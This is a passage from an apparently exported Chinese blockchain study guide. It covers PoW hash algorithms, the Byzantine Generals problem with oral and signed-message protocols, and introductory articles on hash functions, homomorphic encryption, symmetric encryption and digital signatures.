Juels的文章中才被真正提出。\n主流POW共识使用的哈希算法\n实际不同的POW共识的核心就是不同的哈希算法，已经有很多Hash函数被设计出来并广泛应用，不过Hash函数一般安全寿命都不长，被认为安全的算法往往没能使用多久就被成功攻击，新的更安全的算法相继被设计出来，而每一个被公认为安全可靠的算法都有及其严格的审计过程。在币圈中我们经常说某某币发明了某种算法，其实主要都是使用那些被认证过的安全算法，或是单独使用，或是排列组合使用。\nSHA256\nSHA-2，名称来自于安全散列算法2（英语：Secure Hash Algorithm 2）的缩写，一种密码散列函数算法标准，由美国国家安全局研发，属于SHA算法之一，是SHA-1的后继者。SHA-2下又可再分为六个不同的算法标准。包括了：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。\n具体的算法解释请查看此文：区块链技术栈全景分析\nSCRYPT\nScrypt是内存依赖型的POW算法，莱特币采用此算法。第一个使用Scrypt算法的数字货币是Tenebrix，而后该算法被莱特币使用。莱特币创始人在莱特币创世帖中介绍了莱特币采用的共识机制，挖矿算法，发行总量，挖矿难度等相关重要信息。李启威说明了莱特币所使用的挖矿算法为数字货币Tenebrix所使用的Scrypt算法，是一种符合PoW共识机制的算法。Scrypt算法过程中也需要计算哈希值，但是，Scrypt计算过程中需要使用较多的内存资源。\n其它使用Scrypt算法的数字货币还有数码币（DigitalCoin）、狗狗币（DogeCoin）、幸运币（LuckyCoin）、世界币（WorldCoin）等。\n算法实现：www.imooc.com/article/50372\n串联算法\n重新排列组合是人类一贯以来最常用的创新发明方法。很快，有人不满足于使用单一Hash函数，2013年7月，夸克币（Quark）发布，首创使用多轮Hash算法，看似高大上，其实很简单，就是对输入数据运算了9次hash函数，前一轮运算结果作为后一轮运算的输入。这9轮Hash共使用6种加密算法，分别为BLAKE, BMW, GROESTL, JH, KECCAK和SKEIN，这些都是公认的安全Hash算法，并且早已存在现成的实现代码。\n这种多轮Hash一出现就给人造成直观上很安全很强大的感觉，追捧者无数。现今价格依然坚挺的达世币率先使用11种加密算法（BLAKE, BMW, GROESTL, JH, KECCAK, SKEIN, LUFFA, CUBEHASH, SHAVITE, SIMD, ECHO），美其名曰X11，紧接着X13，X15这一系列就有人开发出来了。\nS系列算法实际是一种串联思路，只要其中一种算法被破解，整个算法就被破解了，好比一根链条，环环相扣，只要其中一环断裂，整个链条就一分为二。\n并联算法\nHeavycoin（HVC）是第一个做了尝试的并联算法，其原理如下：\n\n对输入数据首先运行一次HEFTY1（一种Hash算法）运算，得到结果d1\n以d1为输入，依次进行SHA256、KECCAK512、GROESTL512、BLAKE512运算，分别获得输出d2,d3,d4和d5\n分别提取d2-d5前64位，混淆后形成最终的256位Hash结果，作为区块ID。\n\n\n之所以首先进行一轮HEFTY1 哈希，是因为HEFTY1 运算起来极其困难，其抵御矿机性能远超于SCRYPT。但与SCRYPT一样，安全性没有得到某个官方机构论证，于是加入后面的四种安全性已经得到公认的算法增强安全。\n对比串联和并联的方法，Quark、X11，X13等虽使用了多种HASH函数，但这些算法都是简单的将多种HASH函数串联在一起，仔细思考，其实没有提高整体的抗碰撞性，其安全性更是因木桶效应而由其中安全最弱的算法支撑，其中任何一种Hash函数遭遇碰撞性攻击，都会危及货币系统的安全性。\nHVC从以上每种算法提取64位，经过融合成为最后的结果，实际上是将四种算法并联在一起，其中一种算法被破解只会危及其中64位，四中算法同时被破解才会危及货币系统的安全性。\nETHASH\nEthash是以太坊上面使用的POW算法，具体的介绍可以查看此文（建议关注此公号）：死磕以太坊源码分析之ETHASH算法\nPOW算法存在的问题\n\n算力竞争的设计导致了集中化的矿池：尽管PoW的目的是为了保证系统可以去中心化的运行，然而系统运行到现在，却事实上形成中心化程度很高的五大矿池。五大矿池垄断了世界上90%以上的算力，这可能导致大矿池破坏整个网络的行为\n算力竞争的设计导致了大量的能源消耗： 另外，PoW系统需要产生大量的能源消耗：比特币挖矿比159个国家消耗的能源还多；目前77.7%的全球比特币网络算力仍在中国境内；受益于内蒙古和四川两地充沛的电力资源，中国拥有世界上最多的比特币矿场；到2019年7月，比特币网络将需要比美国目前的用电量更多的电力；到2020年2月，它将使用和今天全世界一样多的电力\n业务处理性能低下：尽管投入了大量的能源支持系统的运行，但这些能源消耗绝大部份是用于工作量证明中的hash运算，处理交易业务的性能则非常低，例如比特币每秒只能进行大约7笔交易；以太坊每秒10-20笔。\n\n参考\n\nweb.xidian.edu.cn/qqpei/files/Blockchain/2Crypto.pdf\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_拜占庭将军问题-7":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_拜占庭将军问题-7","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_拜占庭将军问题-7.md","title":"死磕共识算法_拜占庭将军问题-7","links":[],"tags":[],"content":"\n死磕共识算法|拜占庭将军问题\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个star，有什么问题可以指出，便于大家交流学习。\n\n\n问题描述\n拜占庭帝国想要进攻一个强大的敌人，为此派出了7支军队去包围这个敌人。这个敌人足以抵御3支常规拜占庭军队的同时袭击。基于一些原因，这支军队不能集合在一起单点突破，必须在分开的包围状态下同时攻击。他们任一支军队单独进攻都毫无胜算，除非有至少4支军队同时袭击才能攻下敌国。他们分散在敌国的四周，依靠通信兵相互通信来协商进攻意向及进攻时间。困扰这些将军的问题是，他们不确定他们中是否有叛徒，叛徒可能擅自变更进攻意向或者进攻时间。在这种状态下，拜占庭将军们能否找到一种分布式的协议来让他们能够远程协商，从而赢取战斗？这就是著名的拜占庭将军问题。\n在拜占庭将军问题中并不去考虑通信兵是否会被截获或无法传达信息等问题，即消息传递的信道绝无问。Lamport已经证明了在消息可能丢失的不可靠信道上试图通过消息传递的方式达到一致性是不可能的。所以，在研究拜占庭将军问题的时候，我们已经假定了信道是没有问题的，并在这个前提下，去做一致性和容错性相关研究。\n根据如下例子，大致的对问题有个形象的理解：\n\n恶意将军分别发送进攻命令和撤退命令，进攻的善良将军则会以为是4票，大于撤退的3票，他们就会进攻，撤退的善良将军也会以为是4票，他们就会撤退，则导致了最终的任务失败。\n问题实质\n首先我们明白一群忠实将军需要实现某一个目标（这里为一致进攻或者一致撤退）（最终的共识结果），这里两个侧重点，一个是某一个目标，第二个是忠实将军，这个目标讲述了两个特性：一致性和正确性。\n\n一致性：所有忠实将军们基于相同的行动计划（一致进攻或者一致撤退）都达成了一致性。\n正确性：保证了一致性的前提下（只有进攻和撤退这两个选项），也要保证行动的正确性(即遵守忠实将军的命令)。\n\n那么拜占庭将军问题可以抽象如下：\n设计一个协议，一个发送消息的将军（以下简称司令官）发送指令给所有其他将军，使得：\nIC1. 所有忠诚的将军遵守同一个命令（一致性）\nIC2. 假如司令官是忠诚的，则其他每个将军遵守他的命令（正确性）\n约定：忠诚将军遵守协议，叛徒破坏协议，且叛徒是匿名的。\n口头协议\n定义\n为定义口头消息，拜占庭将军消息系统具有以下假设：\nA1. 每个被发送的消息能够被正确的发出\nA2. 消息接收者知道谁发送的消息\nA3. 能够知道缺少的消息\n假设 A1和A2防止叛徒干扰其他将军的通信，假设 A3 防止叛徒通过不发消息干扰一致性达成 。\n\n先出结论，如果有m个叛军，必须至少有 3m+1位将军才能保证口头协议算法能解“拜占庭将军问题”。否则问题不可解。\n\n口头协议算法OM(m)\n假设有m个叛徒，n个将军\n①：OM(m)算法，m=0\na. 一开始发送消息的将军（以下简称司令官）发送指令给所有其他将军;\nb. 将军接受指令，或者用默认值如果消息未收到的话；\n②：OM(m)算法，m&gt;0\na. 司令官发送指令给所有其他将军;\nb. 对于每个将军i，Vi的值从司令官获得，并且将军i执行新一轮OM(m-1)算法，作为OM(m-1)算法中的司令官向剩下的n-2个将军发送Vi(除去OM(m)中司令官和自己)；或者用默认值如果消息未收到的话；\nc.对于每个将军i (即收到指令的将军),并且j不等于i, Vj 的值从将军 j在上面 b 步骤中获得的值，或者用默认值如果未收到将军j的消息的话，这样就可以得到V1,…Vn-1个值，最后执行Majority(V1,…Vn-1)取得将军i的最终确认指令V；\n详细解释：\nOM算法里面有个Majority()函数，用来判断忠诚的将军最终应该是执行什么指令，逻辑为： 在输入的一系列V1,V2…Vn 中，找到最多相同数量的值作为输出，如果找不到，用默认值替代。 比如： V1=进攻，V2=进攻，V3=撤退，Majority(v1, V2, v3)=进攻。为什么要加这一步呢，由于司令官也有可能是叛军，所以单纯的把司令官的指令当做最终指令肯定是不行的。Vi代表从其他将军那里获得的关于司令官的指令，假设司令官告诉将军B的指令是”进攻”，如果将军B是忠诚的话，将军B会如实通知将军A“司令官告诉我的指令是进攻”，如果将军B是叛军的话，将军B可能会说“司令官告诉我的指令是撤退”或者干脆不发信息。通过Majority()函数，在忠诚的将军多于叛军（n&gt;=3m+1）的情况下，可以保证忠诚的将军得到相同的结论，即满足条件IC1。\n口头协议推演\nOM(m)算法中的第b步使用了递归，这个确实很难理解，下面举实例来说明：\na. 当m=1,n=4并且叛军不是司令官时，根据OM(m)算法, 将军A的最终指令V = Majority(V1, V2, V3)= Majority(“进攻”，进攻，“撤退”）= 进攻，其中V1来自司令官的通知，V2来自将军B告诉将军A的司令官的指令，V3由于是叛军，其实发出什么指令已经无所谓，Majority函数必能让将军A和将军B获得一致的并且是正确的指令，即满足条件IC1和CI2;\n\nb.当m=1,n=4，并且叛军是司令官时，每位将军的Majority(V1,V2,V3)=Majority(x,y,z)，满足条件IC1.\n\nc. 当m=2, n=7,并且司令官是忠诚，虽然只是多了一个叛徒，但是会出现递归过程\n\n上图描述了司令官发送进攻消息给其他6位将军，我们只讨论将军1的决策过程：\n\n首先将军1从司令官接收到 A 命令\n将军1会询问 （3，4，5，6）关于2号将军接收的是什么命令\n（3，4，5，6）中3和4会如实转述2号将军的命令是A，而5和 6号将军是作恶节点，会说2号将军告诉他们的是O命令，最后得出结论（A，A，A，O，O）（多数原则）,所以得出结论2号将军接收的是A命令，即V2=A\n同理可得V3、V4、V5、V6\n最后将军1知道了2、3、4、5、6的命令为（A，A，A，O，O），最后将军1会采取A命令策略\n\n同理可以得出2，3，4，5，6将军的策略分别为（A，A，A，O，O）,所以最终1-6的将军策略为（A，A，A，A，O，O）,所以忠诚的将军最终保持了一致性，同时选择了A，同时司令官是忠诚的，所有的将军都执行了司令官的命令，保证了准确性。\n当m的值越大，这个算法的复杂度会越高。\n书面协议\n定义\n口头协议中我们讨论了很多，揭示了口头协议的缺点是消息不能追本溯源，这使得口头协议必须在四模冗余的情况下才能保证正确。但是，若能引入一种方法让消息能够追本溯源，情况会不会有所改变呢？这就是书面协议引入的灵感。\n这里通过签名就是为了防止说谎，可以追本溯源。除了满足口头消息A1-A3 三点要求外还应该满足下面A4:\na. 签名不可被伪造，一旦被篡改即可发现\nb. 任何人都可以验证将军签名的可靠性\n\n结论：对于任意n ，最多只有m个背叛者情况下，算法SM(m)能解决拜占庭将军问题。也就是说，在使用签名的情况下，书面协议可以打破三模冗余的僵局，使用了签名的情况下，只要知道了叛徒数量，我们就可以利用SM(m)算法解决拜占庭将军问题\n\n书面协议算法SM(m)\n算法SM(m)，不管将军总数n和叛徒数量m，只要采用该算法，忠诚的将军总能达到一致（满足IC1和IC2）。\n我们用集合Vi来表示i将军收到的命令集，这是一个集合，也就是满足互异性（没有重复的元素）。\n我们定义choice(V)函数来决定各个将军的选择，这个函数可以有非常多种形式，他只要满足了以下两个条件：\n\n如果集合V只包含了一个元素v，那么choice(V)=v\nchoice(o)=RETREAT，其中o是空集\n\n算法解释如下：\n初始化Vi=空集合。\n①：司令官签署命令并发给每个将军\n②：对于每个将军i :\n​\t\tA：如果将军i从发令者收到v:0的消息，且还没有收到其他命令序列，那么他\n​\t\t\ta:使Vi为{v}；\n​\t\t\tb:发送v:0:i给其他所有副官。\n​\t\tB：如果副官i收到了形如v:0:j1:…:jk的消息且v不在集合Vi中，那么他\n​\t\t\ta:添加v到Vi；\n​\t\t\tb:如果k&lt;m，那么发送v:0:j1:…:jk:i 给每个不在j1,..,jk 中的副官。\n③：对于每个副官i，当他不再收到任何消息，则遵守命令choive(Vi)\n值得注意的是，如果司令忠诚，由于其签名不可伪造，所有忠诚的副官都将得到一个单点集{v}，他们采用的命令集Vi相同，得到的choive(Vi)也为v，满足了IC1和IC2。\n如果司令并非忠诚，只需要满足IC1，但是算法SM(m)使得所有忠诚的副官得到相同的Vi，使用choice()函数后采用的命令也就一定相同。\n书面协议推演\n司令是叛徒的状况稍难想象，举个例子，n=3，m=1，其中司令是叛徒，这是口头协议不能解决的状况。\n\n很显然，副官1得到的V1={A,R}，副官2得到相同的V2={A,R}。他们采用choice函数后得到的命令一定相同。\nn=4，m=2，其中司令是叛徒，这同样是口头协议不能解决的状况。\n\n副官1和副官2得到的V1=V2={A,R}，他们采用choice函数后得到的命令也相同。\n书面协议的本质就是引入了签名系统，这使得所有消息都可追本溯源。这一优势，大大节省了成本，他化解了口头协议中1/3要求，只要采用了书面协议，忠诚的将军就可以达到一致（实现IC1和IC2）。这个效果是惊人的，相较之下口头协议则明显有一些缺陷。\n书面协议的结论非常令人兴奋，这不是解决了拜占庭将军问题了吗？但请注意我们在A1-A4中实际上是添加了一些条件的，这使得拜占庭将军问题在这些假设下能够解决，但是在实际状况中却会有一些问题。观察A1~A4，我们做了一些在现实中比较难以完成的假设，比如没考虑传输信息的延迟时间，书面协议的签名体系难以实现，而且签名消息记录的保存难以摆脱一个中心化机构而独立存在。事实上，存在能够完美解决书面协议实际局限的方法就是区块链。\n参考\n\ngithub.com/blockchainGuide\npeople.eecs.berkeley.edu/~luca/cs174/byzantine.pdf\npmg.csail.mit.edu/papers/osdi99.pdf\nwww.microsoft.com/en-us/research/wp-content/uploads/2017/01/thesis-mcastro.pdf\nwww.microsoft.com/en-us/research/uploads/prod/2016/12/The-Byzantine-Generals.pdf\nwww.bilibili.com/video/BV1yJ411v7xV\n"},"blockchainguide/Public_Chain_Development/Cryptography/BLS签名算法":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/BLS签名算法","filePath":"blockchainguide/Public_Chain_Development/Cryptography/BLS签名算法.md","title":"BLS签名算法","links":[],"tags":[],"content":"参考\n[1] ： bls-go实现"},"blockchainguide/Public_Chain_Development/Cryptography/基础/哈希函数":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/基础/哈希函数","filePath":"blockchainguide/Public_Chain_Development/Cryptography/基础/哈希函数.md","title":"哈希函数","links":[],"tags":[],"content":"哈希函数原理\n哈希函数（Hash Function）是一种密码学算法，它接受任意长度的输入并产生固定长度的输出。哈希函数在计算机科学、密码学和数据存储等领域具有广泛的应用。以下是对哈希函数原理的详细介绍。\n哈希函数的特性\n理想的哈希函数应具备以下特性：\n\n确定性：相同的输入必须产生相同的输出。这意味着每次使用相同的输入对哈希函数进行计算，都应该得到相同的哈希值。\n高速计算：哈希函数应能快速地处理输入数据并生成哈希值。这使得哈希函数在数据检索、验证和密码学等场景中更加高效。\n雪崩效应：哈希函数应对输入数据非常敏感，即使输入数据的微小变化也应导致哈希值的显著变化。这有助于确保哈希函数在密码学应用中的安全性。\n不可逆性：从哈希值反推输入数据应该具有很高的计算难度。这意味着攻击者不能通过哈希值轻易地推导出原始数据，从而保护了数据的机密性。\n抗碰撞：找到两个不同的输入，它们产生相同的哈希值，应具有很高的计算难度。这有助于防止哈希碰撞攻击，确保哈希函数在密码学应用中的安全性。\n\n常见的哈希函数\n以下是一些常见的哈希函数：\n\nMD5：MD5（Message-Digest Algorithm 5）是一种广泛使用的哈希函数，由Ronald Rivest于1991年开发。MD5生成128位（16字节）的哈希值。然而，MD5的安全性已经受到质疑，因为存在多种有效的碰撞攻击方法。\nSHA-1：SHA-1（Secure Hash Algorithm 1）是由美国国家安全局（NSA）开发的一种哈希函数。SHA-1生成160位（20字节）的哈希值。与MD5类似，SHA-1的安全性也受到质疑，已经被认为不再适用于密码学应用。\nSHA-2：SHA-2是一种哈希函数族，包括SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224和SHA-512/256等变体。SHA-2是SHA-1的后继者，提供了更强大的安全性。SHA-2目前仍被认为是安全的\n并被广泛应用于各种密码学场景。\n\nSHA-3：SHA-3是一种全新的哈希函数，由比尔吉·贝尔塔尔姆（Guido Bertoni）、琼·达门（Joan Daemen）、迈克尔·皮普（Michaël Peeters）和吉尔斯·范·奥斯特（Gilles Van Assche）于2012年开发。SHA-3基于Keccak算法，并在2015年被美国国家标准与技术研究所（NIST）采用为新的安全哈希算法标准。SHA-3包括SHA3-224、SHA3-256、SHA3-384、SHA3-512等变体。SHA-3的设计目标是提供与SHA-2相似的安全性，但具有不同的内部结构和抗攻击特性。\n\n\n\n哈希函数的应用\n哈希函数在计算机科学和密码学中具有广泛的应用，以下是一些常见的应用场景：\n\n数据完整性验证：哈希函数可以用于验证数据的完整性。通过计算文件或数据的哈希值，并与预先存储的哈希值进行比较，可以检测数据是否被篡改。\n密码存储：哈希函数通常用于安全地存储用户密码。将用户密码哈希后再存储，这样即使数据库泄露，攻击者也无法直接获取原始密码。通常，哈希函数与盐值（Salt）和密钥扩展函数（如PBKDF2、bcrypt、scrypt等）结合使用，以增强密码存储的安全性。\n数字签名：哈希函数可以用于生成数字签名。通过对消息或文件的哈希值进行签名，可以确保数据的完整性和来源。常见的数字签名算法包括RSA、DSA和ECDSA等。\n区块链技术：哈希函数在区块链技术中发挥着关键作用。区块链中的每个区块都包含上一个区块的哈希值，这样可以确保区块链的不可篡改性和数据完整性。此外，哈希函数还用于区块链的共识算法（如工作量证明，Proof of Work）中。\n\n总之，哈希函数是一种重要的密码学技术，具有众多实际应用。了解哈希函数的原理和特性，有助于我们在数据完整性验证、密码存储、数字签名和区块链等场景中更好地利用哈希函数来保护数据安全。"},"blockchainguide/Public_Chain_Development/Cryptography/基础/完全同态加密":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/基础/完全同态加密","filePath":"blockchainguide/Public_Chain_Development/Cryptography/基础/完全同态加密.md","title":"完全同态加密","links":[],"tags":[],"content":"完全同态加密\n完全同态加密（Fully Homomorphic Encryption，FHE）是一种允许对密文数据进行计算并获得加密结果的密码学技术。换句话说，使用完全同态加密技术，你可以在不解密数据的情况下对其进行计算，并得到一个加密的结果。当需要查看计算结果时，再使用密钥解密。这种加密技术在数据隐私和云计算安全等领域具有重要的应用价值。\n完全同态加密的定义和性质\n一个加密方案被称为完全同态加密，如果它满足以下性质：\n\n同态性：在加密数据上进行的计算与在明文数据上进行的计算具有相同的效果。例如，对于任意两个密文c1和c2，以及对应的明文m1和m2，存在一个操作⊕，使得c1⊕c2等于Encrypt(m1+m2)。\n完全性：加密方案支持任意计算功能。这意味着，通过适当的加密操作，可以在密文上实现任意复杂的计算，而无需先解密数据。\n安全性：完全同态加密方案应提供足够的安全性，以防止未经授权的解密。通常，安全性由计算困难问题（如大数分解问题或离散对数问题）保证。\n\n完全同态加密的发展\n完全同态加密的概念最早由Rivest等人在1978年提出。然而，长时间以来，完全同态加密一直被认为是密码学中的一个未解之谜。直到2009年，Craig Gentry首次提出了一个基于理想格的完全同态加密方案，实现了对密文数据的任意计算。自那时起，完全同态加密的研究取得了许多重要进展。\n以下是一些著名的完全同态加密方案：\n\nGentry的加密方案：Gentry的方案是基于理想格和学习有错误（Learning With Errors，LWE）问题的。该方案引入了“自举”（bootstrapping）技术，使得计算可以在密文上无限次进行。\nBGV方案：Brakerski、Gentry和Vaikuntanathan于2011年提出了一种改进的完全同态加密方案，简称为BGV方案。该方案使用环学习有错误（Ring-LWE）问题，相比Gentry的方案具有更高的效率。\nFV方案：Fan和Vercauteren于2012年提出了一种进一步优化的完全同态加密方案，称为FV方案。FV方案在BGV方案的基础上进行了改进，实现了更高的性能和简化的密钥管理。FV方案在实际应用中得到了广泛关注，成为当前最流行的完全同态加密方案之一。\nTFHE方案：TFHE（Tormentedly Fast Homomorphic Encryption）方案由Chillotti等人于2016年提出。该方案基于环学习有错误问题和快速傅里叶变换（FFT），实现了对比FV方案更高的计算速度。TFHE方案在某些场景下可以提供非常高的效率，使得完全同态加密在实际应用中变得更为可行。\n\nGentry方案\nGentry的加密方案\nGentry的加密方案是第一个实现完全同态加密的密码学方案。该方案基于理想格（ideal lattice）和学习有错误（Learning with Errors，LWE）问题。以下是Gentry方案的主要组成部分：\n\n密钥生成：首先，通过一个特殊的构造过程生成一个理想格。理想格是一种特殊的点阵，它具有数学上的良好性质。然后，从理想格中选择一个“短”向量作为私钥，将整个理想格作为公钥。\n加密：为了加密一个明文m，需要将m嵌入到理想格的一个点上。具体来说，先在理想格中选择一个随机点，然后将明文m加到这个点上。最后，添加一个小的噪声（即错误），得到密文。\n解密：解密过程是通过利用私钥（即短向量）将噪声从密文中去除，然后从理想格的点还原出明文m。由于短向量的特殊性质，这个过程可以有效地完成。\n同态操作：在Gentry的方案中，可以直接对密文进行加法和乘法操作。这意味着我们可以在密文上实现任意多项式函数计算。然而，随着计算的进行，密文中的噪声会逐渐增加，导致解密失败。\n自举：为了解决噪声累积的问题，Gentry引入了一种称为“自举”的技术。自举实际上是一种递归过程，它将加密方案作为一个函数，对自己的密文进行计算。通过自举操作，可以在保持计算正确性的同时减小密文中的噪声。这使得在密文上可以进行无限次计算，从而实现了完全同态加密。\n\n需要注意的是，Gentry的加密方案涉及到许多复杂的数学概念，例如理想格、LWE问题、噪声控制等。在实际应用中，Gentry的方案存在一定的效率问题。\n完全同态加密的应用场景\n由于完全同态加密允许在密文上进行计算，它在保护数据隐私和云计算安全等方面具有巨大潜力。以下是一些潜在的应用场景：\n\n安全的云计算：在云计算中，用户可以将加密的数据上传到云服务器，然后请求云服务器对加密数据进行计算。由于数据始终保持加密状态，云服务提供商无法访问用户的敏感信息。这为数据隐私提供了强大的保障。\n隐私保护的数据挖掘：在数据挖掘中，通常需要处理大量敏感数据。通过使用完全同态加密技术，可以在加密数据上进行数据挖掘，避免泄露用户隐私。\n安全的多方计算：在多方计算场景中，各方需要共同计算一个函数，但又不希望泄露自己的输入数据。完全同态加密可以在不泄露各方输入的情况下，实现多方安全计算。\n\n虽然完全同态加密技术具有诸多潜在的应用场景，但目前其计算效率和实用性仍然有待提高。随着密码学和计算机科学的发展，我们可以期待完全同态加密技术在未来得到更广泛的应用。"},"blockchainguide/Public_Chain_Development/Cryptography/基础/对称加密":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/基础/对称加密","filePath":"blockchainguide/Public_Chain_Development/Cryptography/基础/对称加密.md","title":"对称加密","links":[],"tags":[],"content":"对称加密\n对称加密是一种密码学技术，它使用相同的密钥进行加密和解密操作。相较于非对称加密，对称加密速度较快，但在密钥管理和分发方面存在一定的挑战。以下是对对称加密的详细介绍。\n什么是对称加密？\n对称加密算法使用单一密钥对数据进行加密和解密。发送方和接收方需要共享相同的密钥，以确保安全通信。这种加密方法的优点是处理速度快，适用于大量数据的加密。然而，由于双方需要共享密钥，因此在密钥分发和管理方面存在风险。\n对称加密的类型\n对称加密算法主要分为两类：\n\n流加密（Stream Cipher）：流加密是一种逐位处理明文的加密方法。它使用伪随机数生成器（PRNG）生成密钥流，然后通过异或操作将密钥流与明文结合以生成密文。流加密适用于不可预测长度的数据流，但可能存在安全隐患。常见的流加密算法包括RC4、Salsa20和ChaCha20等。\n块加密（Block Cipher）：块加密是将明文分成固定长度的块，然后对每个块进行加密。这类加密算法通常使用多轮加密操作，包括替换（Substitution）、置换（Permutation）和混淆（Confusion）等步骤。块加密适用于已知长度的数据，如文件加密。常见的块加密算法包括AES、DES和3DES等。\n\n常见的对称加密算法\n以下是一些常见的对称加密算法：\n\n\nAES（Advanced Encryption Standard）：AES是美国国家标准与技术研究院（NIST）认可的对称加密标准。AES支持128、192和256位密钥长度，使用128位数据块。AES具有高安全性和良好的性能，广泛应用于各种场景。\n\n\nDES（Data Encryption Standard）：DES是一种曾经广泛使用的对称加密标准，使用56位密钥和64位数据块。由于其密钥长度较短，DES容易受到暴力破解攻击，目前已被AES替代。\n\n\n3DES（Triple DES）：3DES是DES的扩展版本，通过对数据进行三次DES加密以增强安全性。3DES使用两个或三个不同的56位密钥，相当于112位或168位密钥长度。然而，3DES的加密效率较低，逐渐被AES取代。\n\nBlowfish：Blowfish是一种可变密钥长度的对称加密算法，密钥长度可以从32位到448位。它使用64位数据块并具有高安全性和性能。但在处理大量数据时，Blowfish的加密速度较慢。\nTwofish：Twofish是Blowfish的后继者，使用128位数据块和可变密钥长度（128、192和256位）。Twofish具有良好的安全性和性能，适用于各种场景。\nRC4：RC4是一种流加密算法，具有简单的结构和快速的加密速度。然而，RC4存在一定的安全隐患，已被Salsa20和ChaCha20等更安全的流加密算法替代。\nSalsa20/ChaCha20：Salsa20和ChaCha20是两种高性能流加密算法，它们具有相似的结构，但使用不同的轮函数。这两种算法使用256位密钥，具有高安全性和良好的性能。它们已经逐渐取代RC4成为新一代流加密算法的首选。\n\n密钥管理与分发\n在对称加密中，密钥管理和分发是关键。发送方和接收方需要共享相同的密钥，以保证通信的安全性。但密钥分发存在一定的风险，因为在传输过程中，密钥可能被窃取。\n为解决密钥分发问题，通常采用以下方法：\n\n密钥协商：通过Diffie-Hellman密钥交换、Elliptic Curve Diffie-Hellman（ECDH）等算法，在双方之间安全地生成共享密钥。\n密钥传输：使用非对称加密算法（如RSA）对密钥进行加密传输。接收方使用其私钥解密以获取对称加密密钥。\n\n对称加密在许多现实应用中发挥着重要作用，如TLS/SSL安全通信、磁盘加密和文件加密等。了解对称加密的基本原理和常见算法，有助于我们更好地理解和使用加密技术保护数据安全。\n对称加密与其他加密技术的结合\n对称加密算法虽然在加密速度和性能方面具有优势，但在密钥管理和分发方面存在挑战。因此，通常将对称加密与其他加密技术（如非对称加密和哈希函数）结合使用，以实现更高的安全性和可用性。\n\n混合加密（Hybrid Encryption）：混合加密结合了对称加密和非对称加密的优点。在通信过程中，使用非对称加密算法安全地传输对称加密密钥，然后使用对称加密算法加密实际数据。这样，既保证了通信的安全性，又提高了加密效率。混合加密广泛应用于TLS/SSL等安全通信协议。\n加密认证（Authenticated Encryption）：加密认证结合了加密和消息认证码（Message Authentication Code, MAC）技术，以确保数据的机密性、完整性和真实性。常见的加密认证模式包括Galois/Counter Mode（GCM）和Counter with CBC-MAC（CCM）。它们使用对称加密算法（如AES）进行加密，同时使用哈希函数生成消息认证码。\n安全多方计算（Secure Multi-Party Computation, SMPC）：安全多方计算是一种密码学技术，允许多个参与者在不泄露各自数据的情况下共同计算一个函数。SMPC通常结合对称加密、非对称加密和零知识证明等技术，以实现数据隐私和计算安全。\n\n通过将对称加密与其他加密技术相结合，我们可以在保证数据安全的同时，充分利用各种加密技术的优点，实现高效和可靠的加密通信。\n总之，对称加密作为密码学的一种基本技术，具有快速、高效的加密性能，但在密钥管理和分发方面存在一定的挑战。为了克服这些挑战，我们通常将对称加密与其他加密技术结合使用，如非对称加密、哈希函数等。了解对称加密的原理和常见算法，将有助于我们在实际应用中更好地利用加密技术来保护数据和通信安全。\n\n"},"blockchainguide/Public_Chain_Development/Cryptography/基础/数字签名":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/基础/数字签名","filePath":"blockchainguide/Public_Chain_Development/Cryptography/基础/数字签名.md","title":"数字签名","links":[],"tags":[],"content":"数字签名原理\n数字签名是一种用于验证数据完整性和身份认证的密码学技术。它允许发送者对数据进行签名，接收者可以验证签名以确保数据的完整性和发送者的身份。数字签名在网络安全、电子商务、电子邮件等场景中都有广泛应用。以下是对数字签名原理的详细介绍。\n数字签名的基本过程\n数字签名通常包括以下三个基本步骤：\n\n签名生成：发送者对数据进行签名。首先，对原始数据使用哈希函数生成哈希值。然后，使用发送者的私钥对哈希值进行加密，生成数字签名。\n数据传输：发送者将原始数据和数字签名一起发送给接收者。\n签名验证：接收者验证数字签名。首先，使用发送者的公钥对数字签名进行解密，获取哈希值。然后，对收到的原始数据进行哈希计算，生成一个新的哈希值。最后，比较解密得到的哈希值与新计算的哈希值。如果两者相同，则签名验证成功，否则验证失败。\n\n数字签名的安全性\n数字签名的安全性主要依赖于以下几点：\n\n私钥的保密性：只有发送者持有私钥，因此只有发送者才能生成有效的数字签名。私钥的保密性有助于确保签名的唯一性和不可伪造性。\n公钥的公开性：公钥是公开的，任何人都可以使用它来验证数字签名。这有助于确保数字签名的可验证性。\n哈希函数的安全性：哈希函数的安全性对数字签名的完整性验证至关重要。理想的哈希函数应具备不可逆性和抗碰撞特性，以防止攻击者伪造有效的签名。\n签名算法的安全性：签名算法应具有足够的安全性，以防止攻击者通过破解算法来伪造或篡改签名。\n\n常见的数字签名算法\n以下是一些常见的数字签名算法：\n\n\nRSA：RSA是一种基于大数分解问题的公钥密码学算法，支持数字签名。在RSA数字签名中，发送者使用私钥对数据哈希值进行加密，接收者使用公钥进行解密和验证。\n\n\nDSA：DSA（Digital Signature Algorithm）是一种基于离散对数问题的数字签名算法。DSA是美国国家标准局（NIST）推荐的数字签名算法，通常与SHA系列哈希函数\n\n\n一起使用。DSA签名过程包括哈希值的计算、私钥签名和公钥验证。DSA相对于RSA在签名和验证速度上有优势，但生成签名的速度较慢。\n\nECDSA：ECDSA（Elliptic Curve Digital Signature Algorithm）是一种基于椭圆曲线密码学的数字签名算法。ECDSA具有更短的密钥长度和更高的安全性，相比于RSA和DSA在计算效率和存储空间上有优势。ECDSA广泛应用于加密货币（如比特币）和安全通信协议（如TLS）中。\nEdDSA：EdDSA（Edwards-curve Digital Signature 